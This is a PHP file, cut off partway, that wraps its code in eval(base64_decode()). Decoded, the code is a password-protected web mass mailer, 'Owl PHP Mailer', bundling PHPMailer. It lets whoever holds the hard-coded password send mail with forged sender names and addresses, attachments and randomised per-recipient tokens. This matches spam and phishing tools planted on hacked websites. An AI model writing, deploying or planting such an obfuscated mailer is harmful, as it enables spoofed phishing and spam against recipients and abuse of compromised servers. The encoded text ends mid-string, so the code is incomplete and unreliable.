<?=eval("?>".base64_decode("PD9waHAKCi8qKgogKiBPd2wgUEhQIE1haWxlciBieSBbb3dsbWFpbGVyLmlvXQogKiBAdmVyc2lvbiA6IDEuNgoqKi8KCnNlc3Npb25fc3RhcnQoKTsKc2V0X3RpbWVfbGltaXQoMCk7CmluaV9zZXQoIm1lbW9yeV9saW1pdCIsLTEpOwoKaGVhZGVyKCJDYWNoZS1Db250cm9sOiBuby1zdG9yZSwgbm8tY2FjaGUsIG11c3QtcmV2YWxpZGF0ZSwgbWF4LWFnZT0wIik7CmhlYWRlcigiQ2FjaGUtQ29udHJvbDogcG9zdC1jaGVjaz0wLCBwcmUtY2hlY2s9MCIsIGZhbHNlKTsKaGVhZGVyKCJQcmFnbWE6IG5vLWNhY2hlIik7CmhlYWRlcigiQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luOiAqIik7CgogCiRwYXNzd29yZCA9ICJjZWNpbGlhMTIzNDUiOyAvLyBQYXNzd29yZCAKJG93bFsndmVyc2lvbiddPSIxLjYiOwokb3dsWyd3ZWJzaXRlJ109Im93bG1haWxlci5pbyI7CgogICAgCmlmKGlzc2V0KCRfUE9TVFsnYWN0aW9uJ10pICYmICRfUE9TVFsnYWN0aW9uJ10gPT0gInNlbmQiKXsKICAgICRHTE9CQUxTWyJyZWNpcGllbnQiXSA9IG93bFRyaW0oJF9QT1NUWydyZWNpcGllbnQnXSk7CiAgICAkR0xPQkFMU1sic210cEFjY3QiXSA9IG93bFRyaW0oJF9QT1NUWydzbXRwQWNjdCddKTsKICAgICRHTE9CQUxTWyJzZW5kZXJOYW1lIl0gPSBvd2xUcmltKCRfUE9TVFsnc2VuZGVyTmFtZSddKTsKICAgICRHTE9CQUxTWyJzZW5kaW5nTWV0aG9kIl0gPSBvd2xUcmltKCRfUE9TVFsnc2VuZGluZ01ldGhvZCddKTsKICAgICRHTE9CQUxTWyJzZW5kZXJFbWFpbCJdID0gb3dsVHJpbSgkX1BPU1RbJ3NlbmRlckVtYWlsJ10pOwogICAgJEdMT0JBTFNbInJlcGx5VG8iXSA9IG93bFRyaW0oJF9QT1NUWydyZXBseVRvJ10pOwoKICAgICRtZXNzYWdlTGV0dGVyID0gb3dsVHJpbSgkX1BPU1RbJ21lc3NhZ2VMZXR0ZXInXSk7CiAgICAkbWVzc2FnZUxldHRlciA9IHVybGVuY29kZSgkbWVzc2FnZUxldHRlcik7CiAgICAkbWVzc2FnZUxldHRlciA9IHByZWdfcmVwbGFjZSgiLyU1QyUyMi8iLCAiJTIyIiwgJG1lc3NhZ2VMZXR0ZXIpOwogICAgJG1lc3NhZ2VMZXR0ZXIgPSB1cmxkZWNvZGUoJG1lc3NhZ2VMZXR0ZXIpOwogICAgJEdMT0JBTFNbIm1lc3NhZ2VMZXR0ZXIiXSA9IHN0cmlwc2xhc2hlcygkbWVzc2FnZUxldHRlcik7CgogICAgJGFsdE1lc3NhZ2VMZXR0ZXIgPSBvd2xUcmltKCRfUE9TVFsnYWx0TWVzc2FnZUxldHRlciddKTsKICAgICRhbHRNZXNzYWdlTGV0dGVyID0gdXJsZW5jb2RlKCRhbHRNZXNzYWdlTGV0dGVyKTsKICAgICRhbHRNZXNzYWdlTGV0dGVyID0gcHJlZ19yZXBsYWNlKCIvJTVDJTIyLyIsICIlMjIiLCAkYWx0TWVzc2FnZUxldHRlcik7CiAgICAkYWx0TWVzc2FnZUxldHRlciA9IHVybGRlY29kZSgkYWx0TWVzc2FnZUxldHRlcik7CiAgICAkR0xPQkFMU1siYWx0TWVzc2FnZUxldHRlciJdID0gc3RyaXBzbGFzaGVzKCRhbHRNZXNzYWdlTGV0dGVyKTsKCiAgICAkR0xPQkFMU1sibWVzc2FnZVR5cGUiXSA9IG93bFRyaW0oJF9QT1NUWydtZXNzYWdlVHlwZSddKTsKICAgICRlbmNvZGluZ1R5cGUgPSBvd2xUcmltKCRfUE9TVFsnZW5jb2RpbmdUeXBlJ10pOwogICAgJEdMT0JBTFNbImVuY29kaW5nVHlwZSJdID0gc3RyaXBzbGFzaGVzKCRlbmNvZGluZ1R5cGUpOwogICAgJGVtYWlsUHJpb3JpdHkgPSBvd2xUcmltKCRfUE9TVFsnZW1haWxQcmlvcml0eSddKTsKICAgICRHTE9CQUxTWyJlbWFpbFByaW9yaXR5Il0gPSBzdHJpcHNsYXNoZXMoJGVtYWlsUHJpb3JpdHkpOwogICAgJG1lc3NhZ2VTdWJqZWN0ID0gb3dsVHJpbSgkX1BPU1RbJ21lc3NhZ2VTdWJqZWN0J10pOwogICAgJEdMT0JBTFNbIm1lc3NhZ2VTdWJqZWN0Il0gPSBzdHJpcHNsYXNoZXMoJG1lc3NhZ2VTdWJqZWN0KTsKCiAgICBwcm9jZXNzRW1haWxTZW5kaW5nUmVxdWVzdCgpOwp9CgoKCiRzZXNzaW9uY29kZSA9IG1kNShfX0ZJTEVfXyk7CmlmKCFpc3NldCgkX1NFU1NJT05bJHNlc3Npb25jb2RlXSkpCiAgICAkX1NFU1NJT05bJHNlc3Npb25jb2RlXSA9ICcnOwoKaWYoIWVtcHR5KCRwYXNzd29yZCkgJiYgJF9TRVNTSU9OWyRzZXNzaW9uY29kZV0gIT0gJHBhc3N3b3JkKXsKICAgICMgX1JFUVVFU1QgbWVhbiBfUE9TVCBvciBfR0VUIAogICAgaWYgKGlzc2V0KCRfUkVRVUVTVFsncGFzcyddKSBhbmQgJF9SRVFVRVNUWydwYXNzJ10gPT0gJHBhc3N3b3JkKSB7CiAgICAgICAgJF9TRVNTSU9OWyRzZXNzaW9uY29kZV0gPSAkcGFzc3dvcmQ7CiAgICB9CiAgICBlbHNlIHsKICAgICAgICBwcmludCAiPHByZSBhbGlnbj1jZW50ZXI+PGZvcm0gbWV0aG9kPXBvc3Q+UGFzc3dvcmQ6IDxpbnB1dCB0eXBlPSdwYXNzd29yZCcgbmFtZT0ncGFzcyc+PGlucHV0IHR5cGU9J3N1Ym1pdCcgdmFsdWU9Jz4+Jz48L2Zvcm0+PC9wcmU+IjsKICAgICAgICBleGl0OyAgICAgICAgCiAgICB9Cn0KCmZ1bmN0aW9uIHNldFNlbmRpbmdNZXRob2QoKQp7CiAgJG1haWwgPSBuZXcgUEhQTWFpbGVyOwoKICBpZigkR0xPQkFMU1sic2VuZGluZ01ldGhvZCJdID09ICJzbXRwIikKICB7CiAgICAkbWFpbC0+SXNTTVRQKCk7CiAgICAkcGFydHMgPSBleHBsb2RlKCc6JywgJEdMT0JBTFNbInNtdHBBY2N0Il0pOwogICAgJG1haWwtPkhvc3QgPSBvd2xUcmltKCRwYXJ0c1swXSk7CiAgICAkbWFpbC0+UG9ydCA9IG93bFRyaW0oJHBhcnRzWzFdKTsKCiAgICBpZihvd2xUcmltKCRwYXJ0c1syXSkgPT0gJ3NzbCcpCiAgICAgICRtYWlsLT5TTVRQU2VjdXJlID0gJ3NzbCc7CiAgICBlbHNlIGlmKG93bFRyaW0oJHBhcnRzWzJdKSA9PSAndGxzJykKICAgICAgJG1haWwtPlNNVFBTZWN1cmUgPSAndGxzJzsKICAgIGVsc2UKICAgICAgJG1haWwtPlNNVFBTZWN1cmUgPSAnJzsKCiAgICBpZihpc3NldCgkcGFydHNbM10pICYmIGlzc2V0KCRwYXJ0c1s0XSkpCiAgICB7CiAgICAgICAgJG1haWwtPlNNVFBBdXRoID0gdHJ1ZTsKICAgICAgICAkbWFpbC0+VXNlcm5hbWUgPSBvd2xUcmltKCRwYXJ0c1szXSk7CiAgICAgICAgJG1haWwtPlBhc3N3b3JkID0gb3dsVHJpbSgkcGFydHNbNF0pOwogICAgfQogICAgCgogIH0KICByZXR1cm4gJG1haWw7Cn0KCgpmdW5jdGlvbiBwcm9jZXNzRW1haWxTZW5kaW5nUmVxdWVzdCgpCnsKICBpZighaXNfZW1haWwoJEdMT0JBTFNbInJlY2lwaWVudCJdKSkKICAgIGV4aXQoIkluY29ycmVjdCBFbWFpbCIpOwoKICAkbWFpbCA9IHNldFNlbmRpbmdNZXRob2QoKTsKICAkZnJvbUVtYWlsID0gb3dsQ2xlYXIoJEdMT0JBTFNbInNlbmRlckVtYWlsIl0sICRHTE9CQUxTWyJyZWNpcGllbnQiXSk7CiAgJGZyb21OYW1lID0gb3dsQ2xlYXIoJEdMT0JBTFNbInNlbmRlck5hbWUiXSwgJEdMT0JBTFNbInJlY2lwaWVudCJdKTsKICAkcmVwbHlUbyA9IG93bENsZWFyKCRHTE9CQUxTWyJyZXBseVRvIl0sICRHTE9CQUxTWyJyZWNpcGllbnQiXSk7CiAgJHJlY2lwaWVudCA9ICRHTE9CQUxTWyJyZWNpcGllbnQiXTsKICAkc3ViamVjdCA9IG93bENsZWFyKCRHTE9CQUxTWyJtZXNzYWdlU3ViamVjdCJdLCAkR0xPQkFMU1sicmVjaXBpZW50Il0pOwogICRib2R5ID0gb3dsQ2xlYXIoJEdMT0JBTFNbIm1lc3NhZ2VMZXR0ZXIiXSwgJEdMT0JBTFNbInJlY2lwaWVudCJdKTsKICAkYWx0Qm9keSA9IG93bENsZWFyKCRHTE9CQUxTWyJhbHRNZXNzYWdlTGV0dGVyIl0sICRHTE9CQUxTWyJyZWNpcGllbnQiXSk7CiAgJGNoYXJTZXQgPSAkR0xPQkFMU1siZW5jb2RpbmdUeXBlIl07CiAgJG1lc3NhZ2VUeXBlID0gJEdMT0JBTFNbIm1lc3NhZ2VUeXBlIl07CiAgJGVtYWlsUHJpb3JpdHkgPSAkR0xPQkFMU1siZW1haWxQcmlvcml0eSJdOwogICAgCiAgJG1haWwtPnNldEZyb20oJGZyb21FbWFpbCwgJGZyb21OYW1lKTsKICAKICBpZihpc3NldCgkcmVwbHlUbykgJiYgJHJlcGx5VG8gIT09ICIiKQogICAgJG1haWwtPmFkZFJlcGx5VG8oJHJlcGx5VG8pOwogIAogICRtYWlsLT5hZGRBZGRyZXNzKCRyZWNpcGllbnQpOwogIAogIGlmKGlzc2V0KCRzdWJqZWN0KSAmJiAkc3ViamVjdCAhPT0gIiIpCiAgICAkbWFpbC0+U3ViamVjdCA9ICRzdWJqZWN0OwogICAgCiAgaWYoaXNzZXQoJGJvZHkpICYmICRib2R5ICE9PSAiIikKICAgICRtYWlsLT5Cb2R5ID0gICRib2R5OwogIAogIGlmKGlzc2V0KCRjaGFyU2V0KSAmJiAkY2hhclNldCAhPT0gIiIpICAKICAgICRtYWlsLT5DaGFyU2V0ID0gJGNoYXJTZXQ7CgogIGlmKGlzc2V0KCRlbWFpbFByaW9yaXR5KSAmJiAkZW1haWxQcmlvcml0eSAhPT0gIiIpICAKICAgICRtYWlsLT5Qcmlvcml0eSA9ICRlbWFpbFByaW9yaXR5OwoKICBpZihpc3NldCgkYWx0Qm9keSkgJiYgJGFsdEJvZHkgIT09ICIiKSAgCiAgICAkbWFpbC0+QWx0Qm9keSA9ICRhbHRCb2R5OwogIAogIGlmKGlzc2V0KCRfRklMRVNbJ2F0dGFjaG1lbnQnXSkpCiAgewogICAgZm9yKCRpPTA7ICRpPGNvdW50KCRfRklMRVNbJ2F0dGFjaG1lbnQnXVsnbmFtZSddKTsgJGkrKykgewogICAgICAgIGlmICgkX0ZJTEVTWydhdHRhY2htZW50J11bJ3RtcF9uYW1lJ11bJGldICE9ICIiKXsKICAgICAgICAgICAgJG1haWwtPkFkZEF0dGFjaG1lbnQoJF9GSUxFU1snYXR0YWNobWVudCddWyd0bXBfbmFtZSddWyRpXSwkX0ZJTEVTWydhdHRhY2htZW50J11bJ25hbWUnXVskaV0pOwogICAgICAgIH0KICAgIH0KICB9CgoKICBpZigkbWVzc2FnZVR5cGUgPT0gImh0bWwiKXskbWFpbC0+SXNIVE1MKHRydWUpO30KICBlbHNlIHskbWFpbC0+SXNIVE1MKGZhbHNlKTt9CgogIGlmICghJG1haWwtPnNlbmQoKSkgewogICAgICBleGl0KCRtYWlsLT5FcnJvckluZm8pOwogIH0KICBlbHNlIHsKICAgICAgZXhpdCgiT0siKTsKICB9Cn0KCgpmdW5jdGlvbiBvd2xUcmltKCRzdHJpbmcpewogIHJldHVybiBzdHJpcHNsYXNoZXMobHRyaW0ocnRyaW0oJHN0cmluZykpKTsKfQoKZnVuY3Rpb24gb3dsQ2xlYXIoJHRleHQsJGVtYWlsKXsKICAgICRlbWFpbHVzZXIgPSBwcmVnX3JlcGxhY2UoJy8oW15AXSopLiovJywgJyQxJywgJGVtYWlsKTsKICAgICR0ZXh0ID0gc3RyX3JlcGxhY2UoIlstdGltZS1dIiwgZGF0ZSgibS9kL1kgaDppOnMgYSIsIHRpbWUoKSksICR0ZXh0KTsKICAgICR0ZXh0ID0gc3RyX3JlcGxhY2UoIlstZW1haWwtXSIsICRlbWFpbCwgJHRleHQpOwogICAgJHRleHQgPSBzdHJfcmVwbGFjZSgiWy1lbWFpbHVzZXItXSIsICRlbWFpbHVzZXIsICR0ZXh0KTsKICAgICR0ZXh0ID0gc3RyX3JlcGxhY2UoIlstcmFuZG9tbGV0dGVycy1dIiwgcmFuZFN0cmluZygnYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXonLCA4LCAxNSksICR0ZXh0KTsKICAgICR0ZXh0ID0gc3RyX3JlcGxhY2UoIlstcmFuZG9tc3RyaW5nLV0iLCByYW5kU3RyaW5nKCdhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODknLCA4LCAxNSksICR0ZXh0KTsKICAgICR0ZXh0ID0gc3RyX3JlcGxhY2UoIlstcmFuZG9tbnVtYmVyLV0iLCByYW5kU3RyaW5nKCcwMTIzNDU2Nzg5JywgNywgMTUpLCAkdGV4dCk7CiAgICAkdGV4dCA9IHN0cl9yZXBsYWNlKCJbLXJhbmRvbW1kNS1dIiwgbWQ1KHJhbmQoKSksICR0ZXh0KTsKCSR0ZXh0ID0gc3RyX3JlcGxhY2UoIlstcmEtXSIsIHJhbmQoMSwgMjAwMDApLCAkdGV4dCk7CiAgICByZXR1cm4gJHRleHQ7Cn0KCmZ1bmN0aW9uIHJhbmRTdHJpbmcoJGNvbnNvbmFudHMsICRtaW5fbGVuZ3RoLCAkbWF4X2xlbmd0aCkgewogICAgJGxlbmd0aD1yYW5kKCRtaW5fbGVuZ3RoLCAkbWF4X2xlbmd0aCk7CiAgICAkcGFzc3dvcmQgPSAnJzsKICAgIGZvciAoJGkgPSAwOyAkaSA8ICRsZW5ndGg7ICRpKyspIHsKICAgICAgICAgICAgJHBhc3N3b3JkIC49ICRjb25zb25hbnRzWyhyYW5kKCkgJSBzdHJsZW4oJGNvbnNvbmFudHMpKV07CiAgICB9CiAgICByZXR1cm4gJHBhc3N3b3JkOwp9CgpmdW5jdGlvbiBpc19lbWFpbCgkaW5wdXQpIHsKICAkZW1haWxfcGF0dGVybiA9ICIvXihbYS16QS1aMC05XC1cX1wuXXsxLH0pK0ArKFthLXpBLVowLTlcLVxfXC5dezEsfSkrXC4rKFthLXpdezIsNH0pJC9pIjsKICBpZihwcmVnX21hdGNoKCRlbWFpbF9wYXR0ZXJuLCAkaW5wdXQpKSByZXR1cm4gVFJVRTsKfQoKCi8qKgogKiBQSFBNYWlsZXIgLSBQSFAgZW1haWwgY3JlYXRpb24gYW5kIHRyYW5zcG9ydCBjbGFzcy4KICoKICogQGF1dGhvciAgTWFyY3VzIEJvaW50b24gKFN5bmNocm8vY29vbGJydSkgPHBocG1haWxlckBzeW5jaHJvbWVkaWEuY28udWs+CiAqIEBhdXRob3IgIEppbSBKYWdpZWxza2kgKGppbWphZykgPGppbWphZ0BnbWFpbC5jb20+CiAqIEBhdXRob3IgIEFuZHkgUHJldm9zdCAoY29kZXdvcnh0ZWNoKSA8Y29kZXdvcnh0ZWNoQHVzZXJzLnNvdXJjZWZvcmdlLm5ldD4KICogQGF1dGhvciAgQnJlbnQgUi4gTWF0emVsbGUgKG9yaWdpbmFsIGZvdW5kZXIpCiAqLwpjbGFzcyBQSFBNYWlsZXIKewogICAgY29uc3QgQ0hBUlNFVF9JU084ODU5MSA9ICdpc28tODg1OS0xJzsKICAgIGNvbnN0IENIQVJTRVRfVVRGOCA9ICd1dGYtOCc7CiAgICBjb25zdCBDT05URU5UX1RZUEVfUExBSU5URVhUID0gJ3RleHQvcGxhaW4nOwogICAgY29uc3QgQ09OVEVOVF9UWVBFX1RFWFRfQ0FMRU5EQVIgPSAndGV4dC9jYWxlbmRhcic7CiAgICBjb25zdCBDT05URU5UX1RZUEVfVEVYVF9IVE1MID0gJ3RleHQvaHRtbCc7CiAgICBjb25zdCBDT05URU5UX1RZUEVfTVVMVElQQVJUX0FMVEVSTkFUSVZFID0gJ211bHRpcGFydC9hbHRlcm5hdGl2ZSc7CiAgICBjb25zdCBDT05URU5UX1RZUEVfTVVMVElQQVJUX01JWEVEID0gJ211bHRpcGFydC9taXhlZCc7CiAgICBjb25zdCBDT05URU5UX1RZUEVfTVVMVElQQVJUX1JFTEFURUQgPSAnbXVsdGlwYXJ0L3JlbGF0ZWQnOwogICAgY29uc3QgRU5DT0RJTkdfN0JJVCA9ICc3Yml0JzsKICAgIGNvbnN0IEVOQ09ESU5HXzhCSVQgPSAnOGJpdCc7CiAgICBjb25zdCBFTkNPRElOR19CQVNFNjQgPSAnYmFzZTY0JzsKICAgIGNvbnN0IEVOQ09ESU5HX0JJTkFSWSA9ICdiaW5hcnknOwogICAgY29uc3QgRU5DT0RJTkdfUVVPVEVEX1BSSU5UQUJMRSA9ICdxdW90ZWQtcHJpbnRhYmxlJzsKICAgIC8qKgogICAgICogRW1haWwgcHJpb3JpdHkuCiAgICAgKiBPcHRpb25zOiBudWxsIChkZWZhdWx0KSwgMSA9IEhpZ2gsIDMgPSBOb3JtYWwsIDUgPSBsb3cuCiAgICAgKiBXaGVuIG51bGwsIHRoZSBoZWFkZXIgaXMgbm90IHNldCBhdCBhbGwuCiAgICAgKgogICAgICogQHZhciBpbnQKICAgICAqLwogICAgcHVibGljICRQcmlvcml0eTsKICAgIC8qKgogICAgICogVGhlIGNoYXJhY3RlciBzZXQgb2YgdGhlIG1lc3NhZ2UuCiAgICAgKgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRDaGFyU2V0ID0gc2VsZjo6Q0hBUlNFVF9JU084ODU5MTsKICAgIC8qKgogICAgICogVGhlIE1JTUUgQ29udGVudC10eXBlIG9mIHRoZSBtZXNzYWdlLgogICAgICoKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkQ29udGVudFR5cGUgPSBzZWxmOjpDT05URU5UX1RZUEVfUExBSU5URVhUOwogICAgLyoqCiAgICAgKiBUaGUgbWVzc2FnZSBlbmNvZGluZy4KICAgICAqIE9wdGlvbnM6ICI4Yml0IiwgIjdiaXQiLCAiYmluYXJ5IiwgImJhc2U2NCIsIGFuZCAicXVvdGVkLXByaW50YWJsZSIuCiAgICAgKgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRFbmNvZGluZyA9IHNlbGY6OkVOQ09ESU5HXzhCSVQ7CiAgICAvKioKICAgICAqIEhvbGRzIHRoZSBtb3N0IHJlY2VudCBtYWlsZXIgZXJyb3IgbWVzc2FnZS4KICAgICAqCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJEVycm9ySW5mbyA9ICcnOwogICAgLyoqCiAgICAgKiBUaGUgRnJvbSBlbWFpbCBhZGRyZXNzIGZvciB0aGUgbWVzc2FnZS4KICAgICAqCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJEZyb20gPSAncm9vdEBsb2NhbGhvc3QnOwogICAgLyoqCiAgICAgKiBUaGUgRnJvbSBuYW1lIG9mIHRoZSBtZXNzYWdlLgogICAgICoKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkRnJvbU5hbWUgPSAnUm9vdCBVc2VyJzsKICAgIC8qKgogICAgICogVGhlIGVudmVsb3BlIHNlbmRlciBvZiB0aGUgbWVzc2FnZS4KICAgICAqIFRoaXMgd2lsbCB1c3VhbGx5IGJlIHR1cm5lZCBpbnRvIGEgUmV0dXJuLVBhdGggaGVhZGVyIGJ5IHRoZSByZWNlaXZlciwKICAgICAqIGFuZCBpcyB0aGUgYWRkcmVzcyB0aGF0IGJvdW5jZXMgd2lsbCBiZSBzZW50IHRvLgogICAgICogSWYgbm90IGVtcHR5LCB3aWxsIGJlIHBhc3NlZCB2aWEgYC1mYCB0byBzZW5kbWFpbCBvciBhcyB0aGUgJ01BSUwgRlJPTScgdmFsdWUgb3ZlciBTTVRQLgogICAgICoKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkU2VuZGVyID0gJyc7CiAgICAvKioKICAgICAqIFRoZSBTdWJqZWN0IG9mIHRoZSBtZXNzYWdlLgogICAgICoKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkU3ViamVjdCA9ICcnOwogICAgLyoqCiAgICAgKiBBbiBIVE1MIG9yIHBsYWluIHRleHQgbWVzc2FnZSBib2R5LgogICAgICogSWYgSFRNTCB0aGVuIGNhbGwgaXNIVE1MKHRydWUpLgogICAgICoKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkQm9keSA9ICcnOwogICAgLyoqCiAgICAgKiBUaGUgcGxhaW4tdGV4dCBtZXNzYWdlIGJvZHkuCiAgICAgKiBUaGlzIGJvZHkgY2FuIGJlIHJlYWQgYnkgbWFpbCBjbGllbnRzIHRoYXQgZG8gbm90IGhhdmUgSFRNTCBlbWFpbAogICAgICogY2FwYWJpbGl0eSBzdWNoIGFzIG11dHQgJiBFdWRvcmEuCiAgICAgKiBDbGllbnRzIHRoYXQgY2FuIHJlYWQgSFRNTCB3aWxsIHZpZXcgdGhlIG5vcm1hbCBCb2R5LgogICAgICoKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkQWx0Qm9keSA9ICcnOwogICAgLyoqCiAgICAgKiBBbiBpQ2FsIG1lc3NhZ2UgcGFydCBib2R5LgogICAgICogT25seSBzdXBwb3J0ZWQgaW4gc2ltcGxlIGFsdCBvciBhbHRfaW5saW5lIG1lc3NhZ2UgdHlwZXMKICAgICAqIFRvIGdlbmVyYXRlIGlDYWwgZXZlbnQgc3RydWN0dXJlcywgdXNlIGNsYXNzZXMgbGlrZSBFYXN5UGVhc3lJQ1Mgb3IgaUNhbGNyZWF0b3IuCiAgICAgKgogICAgICogQHNlZSBodHRwOi8vc3ByYWluLmNoL2Jsb2cvZG93bmxvYWRzL3BocC1jbGFzcy1lYXN5cGVhc3lpY3MtY3JlYXRlLWljYWwtZmlsZXMtd2l0aC1waHAvCiAgICAgKiBAc2VlIGh0dHA6Ly9raWdrb25zdWx0LnNlL2lDYWxjcmVhdG9yLwogICAgICoKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkSWNhbCA9ICcnOwogICAgLyoqCiAgICAgKiBUaGUgY29tcGxldGUgY29tcGlsZWQgTUlNRSBtZXNzYWdlIGJvZHkuCiAgICAgKgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkICRNSU1FQm9keSA9ICcnOwogICAgLyoqCiAgICAgKiBUaGUgY29tcGxldGUgY29tcGlsZWQgTUlNRSBtZXNzYWdlIGhlYWRlcnMuCiAgICAgKgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkICRNSU1FSGVhZGVyID0gJyc7CiAgICAvKioKICAgICAqIEV4dHJhIGhlYWRlcnMgdGhhdCBjcmVhdGVIZWFkZXIoKSBkb2Vzbid0IGZvbGQgaW4uCiAgICAgKgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkICRtYWlsSGVhZGVyID0gJyc7CiAgICAvKioKICAgICAqIFdvcmQtd3JhcCB0aGUgbWVzc2FnZSBib2R5IHRvIHRoaXMgbnVtYmVyIG9mIGNoYXJzLgogICAgICogU2V0IHRvIDAgdG8gbm90IHdyYXAuIEEgdXNlZnVsIHZhbHVlIGhlcmUgaXMgNzgsIGZvciBSRkMyODIyIHNlY3Rpb24gMi4xLjEgY29tcGxpYW5jZS4KICAgICAqCiAgICAgKiBAc2VlIHN0YXRpYzo6U1REX0xJTkVfTEVOR1RICiAgICAgKgogICAgICogQHZhciBpbnQKICAgICAqLwogICAgcHVibGljICRXb3JkV3JhcCA9IDA7CiAgICAvKioKICAgICAqIFdoaWNoIG1ldGhvZCB0byB1c2UgdG8gc2VuZCBtYWlsLgogICAgICogT3B0aW9uczogIm1haWwiLCAic2VuZG1haWwiLCBvciAic210cCIuCiAgICAgKgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRNYWlsZXIgPSAnbWFpbCc7CiAgICAvKioKICAgICAqIFRoZSBwYXRoIHRvIHRoZSBzZW5kbWFpbCBwcm9ncmFtLgogICAgICoKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkU2VuZG1haWwgPSAnL3Vzci9zYmluL3NlbmRtYWlsJzsKICAgIC8qKgogICAgICogV2hldGhlciBtYWlsKCkgdXNlcyBhIGZ1bGx5IHNlbmRtYWlsLWNvbXBhdGlibGUgTVRBLgogICAgICogT25lIHdoaWNoIHN1cHBvcnRzIHNlbmRtYWlsJ3MgIi1vaSAtZiIgb3B0aW9ucy4KICAgICAqCiAgICAgKiBAdmFyIGJvb2wKICAgICAqLwogICAgcHVibGljICRVc2VTZW5kbWFpbE9wdGlvbnMgPSB0cnVlOwogICAgLyoqCiAgICAgKiBUaGUgZW1haWwgYWRkcmVzcyB0aGF0IGEgcmVhZGluZyBjb25maXJtYXRpb24gc2hvdWxkIGJlIHNlbnQgdG8sIGFsc28ga25vd24gYXMgcmVhZCByZWNlaXB0LgogICAgICoKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkQ29uZmlybVJlYWRpbmdUbyA9ICcnOwogICAgLyoqCiAgICAgKiBUaGUgaG9zdG5hbWUgdG8gdXNlIGluIHRoZSBNZXNzYWdlLUlEIGhlYWRlciBhbmQgYXMgZGVmYXVsdCBIRUxPIHN0cmluZy4KICAgICAqIElmIGVtcHR5LCBQSFBNYWlsZXIgYXR0ZW1wdHMgdG8gZmluZCBvbmUgd2l0aCwgaW4gb3JkZXIsCiAgICAgKiAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSwgZ2V0aG9zdG5hbWUoKSwgcGhwX3VuYW1lKCduJyksIG9yIHRoZSB2YWx1ZQogICAgICogJ2xvY2FsaG9zdC5sb2NhbGRvbWFpbicuCiAgICAgKgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRIb3N0bmFtZSA9ICcnOwogICAgLyoqCiAgICAgKiBBbiBJRCB0byBiZSB1c2VkIGluIHRoZSBNZXNzYWdlLUlEIGhlYWRlci4KICAgICAqIElmIGVtcHR5LCBhIHVuaXF1ZSBpZCB3aWxsIGJlIGdlbmVyYXRlZC4KICAgICAqIFlvdSBjYW4gc2V0IHlvdXIgb3duLCBidXQgaXQgbXVzdCBiZSBpbiB0aGUgZm9ybWF0ICI8aWRAZG9tYWluPiIsCiAgICAgKiBhcyBkZWZpbmVkIGluIFJGQzUzMjIgc2VjdGlvbiAzLjYuNCBvciBpdCB3aWxsIGJlIGlnbm9yZWQuCiAgICAgKgogICAgICogQHNlZSBodHRwczovL3Rvb2xzLmlldGYub3JnL2h0bWwvcmZjNTMyMiNzZWN0aW9uLTMuNi40CiAgICAgKgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRNZXNzYWdlSUQgPSAnJzsKICAgIC8qKgogICAgICogVGhlIG1lc3NhZ2UgRGF0ZSB0byBiZSB1c2VkIGluIHRoZSBEYXRlIGhlYWRlci4KICAgICAqIElmIGVtcHR5LCB0aGUgY3VycmVudCBkYXRlIHdpbGwgYmUgYWRkZWQuCiAgICAgKgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRNZXNzYWdlRGF0ZSA9ICcnOwogICAgLyoqCiAgICAgKiBTTVRQIGhvc3RzLgogICAgICogRWl0aGVyIGEgc2luZ2xlIGhvc3RuYW1lIG9yIG11bHRpcGxlIHNlbWljb2xvbi1kZWxpbWl0ZWQgaG9zdG5hbWVzLgogICAgICogWW91IGNhbiBhbHNvIHNwZWNpZnkgYSBkaWZmZXJlbnQgcG9ydAogICAgICogZm9yIGVhY2ggaG9zdCBieSB1c2luZyB0aGlzIGZvcm1hdDogW2hvc3RuYW1lOnBvcnRdCiAgICAgKiAoZS5nLiAic210cDEuZXhhbXBsZS5jb206MjU7c210cDIuZXhhbXBsZS5jb20iKS4KICAgICAqIFlvdSBjYW4gYWxzbyBzcGVjaWZ5IGVuY3J5cHRpb24gdHlwZSwgZm9yIGV4YW1wbGU6CiAgICAgKiAoZS5nLiAidGxzOi8vc210cDEuZXhhbXBsZS5jb206NTg3O3NzbDovL3NtdHAyLmV4YW1wbGUuY29tOjQ2NSIpLgogICAgICogSG9zdHMgd2lsbCBiZSB0cmllZCBpbiBvcmRlci4KICAgICAqCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJEhvc3QgPSAnbG9jYWxob3N0JzsKICAgIC8qKgogICAgICogVGhlIGRlZmF1bHQgU01UUCBzZXJ2ZXIgcG9ydC4KICAgICAqCiAgICAgKiBAdmFyIGludAogICAgICovCiAgICBwdWJsaWMgJFBvcnQgPSAyNTsKICAgIC8qKgogICAgICogVG